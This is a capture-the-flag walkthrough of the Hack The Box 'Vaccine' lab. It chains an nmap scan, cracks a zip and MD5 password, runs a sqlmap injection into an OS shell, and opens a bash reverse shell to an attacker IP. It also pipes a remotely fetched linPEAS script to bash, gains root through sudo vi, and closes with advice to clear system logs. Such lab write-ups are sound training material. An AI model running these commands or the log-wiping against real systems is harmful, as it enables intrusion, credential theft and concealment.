---
title: HTB - Vaccine Walkthrough
date: 2021-08-09 16:47:03
tags: [WalkThrough, HTB, Penetration Testing, Starting Point]
---

# Enumeration
```
nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$// >> ports.txt
nmap -sC -sV -p`cat ports.txt` 10.10.10.46

PORT      STATE  SERVICE VERSION
21/tcp    open   ftp     vsftpd 3.0.3
22/tcp    open   ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp    open   http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
48866/tcp closed unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

It seems the port 80 is open, lets take a look

There's a login page

try the previous credentials, does not work, try sql, not work

# FTP login
ftp is open, use the credentials from oopsie:

```
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
```

we get a backup.zip file, try to unzip it, but it is password protected

try to crack it use john

# Crack zip file 
```
zip2john backup.zip > hash
```
crack use rockyou wordlist
```
john hash --fork=4 -w=~/wordlist/rockyou.txt
john hash --show
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
```

password found `741852963`

then unzip the file, cat `index.php`


```
if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {

```
then crack md5 2cb42f8734ea607eefed3b70af13bbd3

using an online rainbow table such as [crackstation](https://crackstation.net/)

find password `qwerty789`

# login web

found a potential sql injection 
```
ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%Elixir' or 'a'='a%' ^
```

use sqlmap
```
set cookie: PHPSESSID=rcmb87pnl11jpe70f1d99euamr

sqlmap -u 'http://10.10.10.46/dashboard.php?search=query' --cookie='PHPSESSID=rcmb87pnl11jpe70f1d99euamr' --os-shell
```

upgrade the dbshell to bash shell
```
nc -nvlp 4444
bash -c 'bash -i >& /dev/tcp/10.10.14.75/4444 0>&1' 
```

```
SHELL=/bin/bash script -q /dev/null
```

in /var/www/html/dashboard.php
```
conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

we could also steal the ssh private key, it is in: `/var/lib/postgresql/.ssh`

```
chmod 600 id_rsa
ssh -i id_rsa postgres@10.10.10.46
```

get the best ssh shell


Linux Privilege Escalation Awesome Script:
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

```
python3 -m http.server 8080
curl http://10.10.14.75:8080/linpeas.sh | bash

══════════╣ Finding 'username' string inside key folders (limit 70)
/var/www/html/index.php:    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
/var/www/html/index.php:        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>


╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files
/var/www/html/dashboard.php:	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
/var/www/html/index.php:    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
/var/www/html/index.php:        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>

```

check `sudo -l` list all available command can be run

a useful link： https://gtfobins.github.io/gtfobins/


```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:!/bin/bash 
```

get the root

# Cover
```
/var/log/auth.log
/var/log/apache2/access.log
```
remove your footprints


